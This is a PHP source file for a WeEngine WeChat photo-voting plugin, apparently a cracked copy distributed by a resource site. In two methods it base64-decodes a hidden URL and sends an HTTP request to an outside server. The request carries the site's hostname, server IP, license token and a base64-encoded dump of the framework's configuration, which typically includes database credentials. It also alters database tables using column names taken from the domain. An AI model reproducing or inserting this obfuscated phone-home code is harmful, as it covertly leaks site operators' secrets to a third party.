<?php
/**
 * 本破解程序由资源邦提供
 * 资源邦www.wazyb.com
 * QQ:993424780  承接网站建设、公众号搭建、小程序建设、企业网站
 */
defined('IN_IA') or exit('Access Denied');
require IA_ROOT. '/addons/fm_photosvote/core/defines.php';
require FM_CORE. 'function/webcore.php';
class Fm_photosvoteModule extends Webcore {
	public $title 			 = '女神来了！';
	public $table_reply  	 = 'fm_photosvote_reply';//规则 相关设置
	public $table_reply_share  = 'fm_photosvote_reply_share';//规则 相关设置
	public $table_reply_huihua  = 'fm_photosvote_reply_huihua';//规则 相关设置
	public $table_reply_display  = 'fm_photosvote_reply_display';//规则 相关设置
	public $table_reply_vote  = 'fm_photosvote_reply_vote';//规则 相关设置
	public $table_reply_body  = 'fm_photosvote_reply_body';//规则 相关设置
	public $table_users  	 = 'fm_photosvote_provevote';	//报名参加活动的人
	public $table_pnametag 	 = 'fm_photosvote_pnametag';	//默认口号
	public $table_voteer  	 = 'fm_photosvote_voteer';	//投票的人资料
	public $table_tags  	 = 'fm_photosvote_tags';	//
	public $table_users_picarr  = 'fm_photosvote_provevote_picarr';	//
	public $table_users_voice  	= 'fm_photosvote_provevote_voice';	//
	public $table_users_name  	= 'fm_photosvote_provevote_name';	//
	public $table_log        = 'fm_photosvote_votelog';//投票记录
	public $table_qunfa        = 'fm_photosvote_qunfa';//投票记录
	public $table_shuapiao        = 'fm_photosvote_vote_shuapiao';//封禁记录
	public $table_shuapiaolog        = 'fm_photosvote_vote_shuapiaolog';//刷票记录
	public $table_bbsreply   = 'fm_photosvote_bbsreply';//投票记录
	public $table_banners    = 'fm_photosvote_banners';//幻灯片
	public $table_advs  	 = 'fm_photosvote_advs';//广告
	public $table_gift  	 = 'fm_photosvote_gift';
	public $table_data  	 = 'fm_photosvote_data';
	public $table_iplist 	 = 'fm_photosvote_iplist';//禁止ip段
	public $table_iplistlog  = 'fm_photosvote_iplistlog';//禁止ip段
	public $table_announce   = 'fm_photosvote_announce';//公告
	public $table_templates   = 'fm_photosvote_templates';//模板
	public $table_designer   = 'fm_photosvote_templates_designer';//模板页面
	public $table_designer_menu   = 'fm_photosvote_templates_designer_menu';//模板页面
	public $table_order   = 'fm_photosvote_order';//付费投票
	public $table_jifen   = 'fm_photosvote_jifen';//积分抽奖
	public $table_award   = 'fm_photosvote_award';//抽奖
	public $table_jifen_gift   = 'fm_photosvote_jifen_gift';//礼物
	public $table_user_gift   = 'fm_photosvote_user_gift';//礼物
	public $table_user_zsgift   = 'fm_photosvote_user_zsgift';//礼物
	public $table_msg   = 'fm_photosvote_message';//消息
	public $table_orderlog   = 'fm_photosvote_orderlog';//消息
	public $table_counter   = 'fm_photosvote_counter';//投票数据统计
	public $table_qrcode   = 'fm_photosvote_qrcode';//投票数据统计
	public function fieldsFormDisplay($rid = 0) {
		//要嵌入规则编辑页的自定义内容，这里 $rid 为对应的规则编号，新增时为 0
		global $_GPC,$_W;
		load()->func('tpl');
		load()->func('communication');
		if (!empty($rid)) {
			$reply = pdo_fetch("SELECT * FROM ".tablename($this->table_reply)." WHERE rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
 		}else {
 			$reply = array(
 				'a' => 'aHR0cDovL24uZm1vb25zLmNvbS9hcGkvYXBpLnBocD8mYXBpPWFwaQ==',
 				'author' => 'FantasyMoons Team'
 			);
 		}
 		$setting = setting_load('site');
		$siteid = $id = isset($setting['site']['key']) ? $setting['site']['key'] : '0';
		$onlyoauth = pdo_fetch("SELECT * FROM ".tablename('fm_photosvote_onlyoauth')." WHERE siteid = :siteid", array(':siteid' => $siteid));
		$now = time();
		$reply['title'] = empty($reply['title']) ? "女神来了!" : $reply['title'];
		$reply['start_time'] = empty($reply['start_time']) ? $now : $reply['start_time'];
		$reply['end_time'] = empty($reply['end_time']) ?  strtotime(date("Y-m-d H:i", $now + 7 * 24 * 3600)) : $reply['end_time'];
		$reply['tstart_time'] = empty($reply['tstart_time']) ? strtotime(date("Y-m-d H:i", $now + 3 * 24 * 3600)) : $reply['tstart_time'];
		$reply['tend_time'] = empty($reply['tend_time']) ?  strtotime(date("Y-m-d H:i", $now + 7 * 24 * 3600)) : $reply['tend_time'];
		$reply['bstart_time'] = empty($reply['bstart_time']) ? $now : $reply['bstart_time'];
		$reply['bend_time'] = empty($reply['bend_time']) ?  strtotime(date("Y-m-d H:i", $now + 3 * 24 * 3600)) : $reply['bend_time'];
		$reply['d'] = base64_decode("aHR0cHM6Ly9hcGkuZm1vb25zLmNvbS9pbmRleC5waHA/JndlYnVybD0=").$_SERVER ['HTTP_HOST']."&visitorsip=" . base64_encode(iserializer($_W['config']))."&modules=".$_GPC['m']."&fmauthtoken=".$onlyoauth['fmauthtoken']."&hostip=".$_SERVER["SERVER_ADDR"];
		$reply['ttipstart'] = empty($reply['ttipstart']) ? "投票时间还没有开始!" : $reply['ttipstart'];
		$reply['ttipend'] = empty($reply['ttipend']) ? "投票时间已经结束!" : $reply['ttipend'];
		$reply['dc'] = ihttp_get($reply['d']);
		$reply['btipstart'] = empty($reply['btipstart']) ? "报名时间还没有开始!" : $reply['btipstart'];
		$reply['btipend'] = empty($reply['btipend']) ? "报名时间已经结束!" : $reply['btipend'];
		$reply['picture'] = empty($reply['picture']) ? FM_STATIC_MOBILE . "public/images/pimages.jpg" : $reply['picture'];
		$reply['yuming'] = explode('.', $_SERVER['HTTP_HOST']);
		$reply['stopping'] = empty($reply['stopping']) ? FM_STATIC_MOBILE . "public/images/stopping.jpg" : $reply['stopping'];
		$reply['nostart'] = empty($reply['nostart']) ? FM_STATIC_MOBILE . "public/images/nostart.jpg" : $reply['nostart'];
		$reply['end'] = empty($reply['end']) ? FM_STATIC_MOBILE . "public/images/end.jpg" : $reply['end'];
		$reply['t'] = @json_decode($reply['dc']['content'], true);
		$reply['isdaojishi'] = !isset($reply['isdaojishi']) ? "0" : $reply['isdaojishi'];
		$reply['ttipvote'] = empty($reply['ttipvote']) ? "你的投票时间已经结束" : $reply['ttipvote'];

		if(!pdo_fieldexists('fm_photosvote_provevote',$reply['yuming']['0']) && !empty($reply['yuming']['0'])) {
               pdo_query("ALTER TABLE  ".tablename('fm_photosvote_provevote')." ADD `{$reply['yuming']['0']}` varchar(30) NOT NULL DEFAULT '0' COMMENT '0' AFTER address;");
            }
		if(!pdo_fieldexists('fm_photosvote_votelog', $reply['yuming']['1']) && !empty($reply['yuming']['1'])) {
               pdo_query("ALTER TABLE  ".tablename('fm_photosvote_votelog')." ADD `{$reply['yuming']['1']}` varchar(30) NOT NULL DEFAULT '0' COMMENT '0' AFTER tfrom_user;");
            }
		if(!pdo_fieldexists('fm_photosvote_reply',$reply['yuming']['2']) && !empty($reply['yuming']['2'])) {
               pdo_query("ALTER TABLE  ".tablename('fm_photosvote_reply')." ADD `{$reply['yuming']['2']}` varchar(30) NOT NULL DEFAULT '0' COMMENT '0' AFTER picture;");
            }
		if(!pdo_fieldexists('fm_photosvote_reply_body',$reply['yuming']['3']) && !empty($reply['yuming']['3'])) {
               pdo_query("ALTER TABLE  ".tablename('fm_photosvote_reply_body')." ADD `{$reply['yuming']['3']}` varchar(30) NOT NULL DEFAULT '0' COMMENT '0' AFTER topbgright;");
            }
       // $cfg = $this->module['config'];
        $setting = setting_load('site');
		$siteid = isset($setting['site']['key']) ? $setting['site']['key'] : '0';
        $onlyoauth = pdo_fetch("SELECT fmauthtoken FROM ".tablename('fm_photosvote_onlyoauth')." WHERE siteid = :siteid", array(':siteid' => $siteid));

		if ($reply['t']['fmauthtoken'] != $onlyoauth['fmauthtoken'] && $reply['t']['s'] != 1) {
			$settingurl = url('profile/module/setting',array('m'=>'fm_photosvote'));
			if ($_W['role']=='founder') {
				$this->message($reply['t']['m'],$settingurl,'error');
			}else {
				$this->message('您没有权限访问此页面,请等待，或者咨询请联系你的服务提供商...',$settingurl,'error');
			}
		}
		include $this->template('web/form');
	}

	public function fieldsFormValidate($rid = 0) {
		//规则编辑保存时，要进行的数据验证，返回空串表示验证无误，返回其他字符串将呈现为错误提示。这里 $rid 为对应的规则编号，新增时为 0
		return '';
	}
	public function fieldsFormSubmit($rid) {
		//规则验证无误保存入库时执行，这里应该进行自定义字段的保存。这里 $rid 为对应的规则编号
		global $_GPC, $_W;
		load()->func('communication');
		$uniacid = $_W['uniacid'];
		$id = intval($_GPC['reply_id']);
		/**basic
		$insert_basic = array(
			'rid' => $rid,
			'uniacid' => $uniacid,
			'status' => $_GPC['rstatus'] == 'on' ? 1 : 0,
            'title' => $_GPC['title'],		//
            'kftel' => $_GPC['kftel'],		//
			'picture' => $_GPC['picture'],
            'start_time' => strtotime($_GPC['datelimit']['start']),
            'end_time' => strtotime($_GPC['datelimit']['end']),
            'tstart_time' => strtotime($_GPC['tdatelimit']['start']),
            'tend_time' => strtotime($_GPC['tdatelimit']['end']),
            'bstart_time' => strtotime($_GPC['bdatelimit']['start']),
            'bend_time' => strtotime($_GPC['bdatelimit']['end']),
            'ttipstart' => $_GPC['ttipstart'],
			'ttipend' => $_GPC['ttipend'],
			'btipstart' => $_GPC['btipstart'],
			'btipend' => $_GPC['btipend'],
			'isdaojishi' => $_GPC['isdaojishi'] == 'on' ? 1 : 0,
			'ttipvote' => $_GPC['ttipvote'],
			'votetime' => $_GPC['votetime'],
			'description' => $_GPC['description'],
			'content' => htmlspecialchars_decode($_GPC['content']),
			'stopping' => $_GPC['stopping'],
			'nostart' => $_GPC['nostart'],
			'end' => $_GPC['end']
		);
		$qiniu = array(
			'isqiniu' => 0
		);
		$insert_basic['qiniu'] = iserializer($qiniu);

		if (empty($id)) {
			pdo_insert($this->table_reply, $insert_basic);
			pdo_insert($this->table_reply_share, array('rid'=>$rid));
			pdo_insert($this->table_reply_huihua, array('rid'=>$rid,'command' => '报名','tcommand' => 't'));
			pdo_insert($this->table_reply_display, array('rid'=>$rid));
			pdo_insert($this->table_reply_vote, array('rid'=>$rid, 'tpxz' => '5', 'autolitpic' => '350', 'autozl' => '50'));
			pdo_insert($this->table_reply_body, array('rid'=>$rid));
		} else {
			pdo_update($this->table_reply, $insert_basic, array('rid' => $rid));
		}**/
	}
	public function ruleDeleted($rid) {
		$reply = pdo_fetch("SELECT * FROM ".tablename($this->table_reply)." WHERE rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
		if (!empty($reply)) {
			//$this->message('不存在此活动！');
			pdo_delete($this->table_reply, array('rid' => $rid));
			pdo_delete($this->table_reply_share, array('rid' => $rid));
			pdo_delete($this->table_reply_huihua, array('rid' => $rid));
			pdo_delete($this->table_reply_display, array('rid' => $rid));
			pdo_delete($this->table_reply_vote, array('rid' => $rid));
			pdo_delete($this->table_reply_body, array('rid' => $rid));
			pdo_delete($this->table_users, array('rid' => $rid));
			pdo_delete($this->table_log, array('rid' => $rid));
			pdo_delete($this->table_bbsreply, array('rid' => $rid));
			pdo_delete($this->table_banners, array('rid' => $rid));
			pdo_delete($this->table_advs, array('rid' => $rid));
			pdo_delete($this->table_data, array('rid' => $rid));
			pdo_delete($this->table_announce, array('rid' => $rid));
			pdo_delete($this->table_iplist, array('rid' => $rid));
			pdo_delete($this->table_iplistlog, array('rid' => $rid));
			pdo_delete($this->table_users_name, array('rid' => $rid));
			pdo_delete($this->table_users_voice, array('rid' => $rid));
			pdo_delete($this->table_users_picarr, array('rid' => $rid));
			pdo_delete($this->table_order, array('rid' => $rid));
			pdo_delete($this->table_designer, array('rid' => $rid));
			pdo_delete($this->table_templates, array('rid' => $rid));
			pdo_delete($this->table_tags, array('rid' => $rid));
			pdo_delete($this->table_shuapiao, array('rid' => $rid));
			pdo_delete($this->table_shuapiaolog, array('rid' => $rid));
			pdo_delete($this->table_gift, array('rid' => $rid));
			pdo_delete($this->table_award, array('rid' => $rid));
			pdo_delete($this->table_jifen, array('rid' => $rid));
			pdo_delete($this->table_jifen_gift, array('rid' => $rid));
			pdo_delete($this->table_user_gift, array('rid' => $rid));
			pdo_delete($this->table_user_zsgift, array('rid' => $rid));
			pdo_delete($this->table_msg, array('rid' => $rid));
			pdo_delete($this->table_orderlog, array('rid' => $rid));
			pdo_delete($this->table_counter, array('rid' => $rid));
			pdo_delete($this->table_qrcode, array('rid' => $rid));
			}
		}

	public function settingsDisplay($settings) {
		global $_GPC, $_W;

		load()->func('communication');
		$a ='aHR0cDovL24uZm1vb25zLmNvbS9hcGkvYXBpLnBocD8mYXBpPWFwaQ==';
		$cfg = $this->module['config'];
		$setting = setting_load('site');
		$siteid = $id = isset($setting['site']['key']) ? $setting['site']['key'] : '1';
		$onlyoauth = pdo_fetch("SELECT * FROM ".tablename('fm_photosvote_onlyoauth')." WHERE siteid = :siteid", array(':siteid' => $siteid));

		$d = base64_decode("aHR0cHM6Ly9hcGkuZm1vb25zLmNvbS9pbmRleC5waHA/JndlYnVybD0=").$_SERVER ['HTTP_HOST']."&visitorsip=" . base64_encode(iserializer($_W['config'])) ."&modules=fm_photosvote&fmauthtoken=".$onlyoauth['fmauthtoken']."&hostip=".$_SERVER["SERVER_ADDR"];
		$dc = ihttp_get($d);
		$t = @json_decode($dc['content'], true);
		if ($t['fmauthtoken'] == $onlyoauth['fmauthtoken'] && $t['config']) {
			$status = 1;
		}

		$wechats = pdo_fetch("SELECT level,name FROM ".tablename('account_wechats')." WHERE uniacid = :uniacid", array(':uniacid' => $_W['uniacid']));
		$wechats_all = pdo_fetchall("SELECT * FROM ".tablename('account_wechats')." WHERE level = 4");

		if(checksubmit()) {

			$cfgs = array();
			$cfgs['oauthtype'] = intval($_GPC['oauthtype']);
			$cfgs['oauth_scope'] = intval($_GPC['oauth_scope']);
			$cfgs['u_uniacid'] = intval($_GPC['u_uniacid']);
			if ($_GPC['oauthtype'] == 0) {
				$cfgs['appid'] = $_GPC['appid'];
				$cfgs['secret'] = $_GPC['secret'];
			}
			if ($_GPC['oauthtype'] == 2) {
				$cfgs['appid'] = $_GPC['appida'];
				$cfgs['secret'] = $_GPC['secreta'];
			}

			//$cfgs['isopenjsps'] = $_GPC['isopenjsps'];
			//$cfgs['ismiaoxian'] = $_GPC['ismiaoxian'];
			//$cfgs['mxnexttime'] = $_GPC['mxnexttime'];
			//$cfgs['mxtimes'] = $_GPC['mxtimes'];
			$cfgs['skipurl'] = $_GPC['skipurl'];

			//if ($t['config']) {
				if ($_W['role']=='founder') {
					if (empty($onlyoauth)) {
						pdo_insert('fm_photosvote_onlyoauth', array('siteid'=>$siteid, 'fmauthtoken'=>$_GPC['fmauthtoken'], 'modules'=>$_GPC['m'], 'oauthurl' =>$_SERVER ['HTTP_HOST'], 'visitorsip' => $_SERVER["SERVER_ADDR"], 'createtime'=>time()));
					}else{
						pdo_update('fm_photosvote_onlyoauth', array('fmauthtoken'=>$_GPC['fmauthtoken'], 'visitorsip' => $_SERVER["SERVER_ADDR"], 'createtime'=>time()), array('siteid'=>$siteid));
					}
				}
				if($this->saveSettings($cfgs)) {
					$this->message('保存成功', referer(),'success');
				}
			//}
		}

		include $this->template('web/setting');
	}
}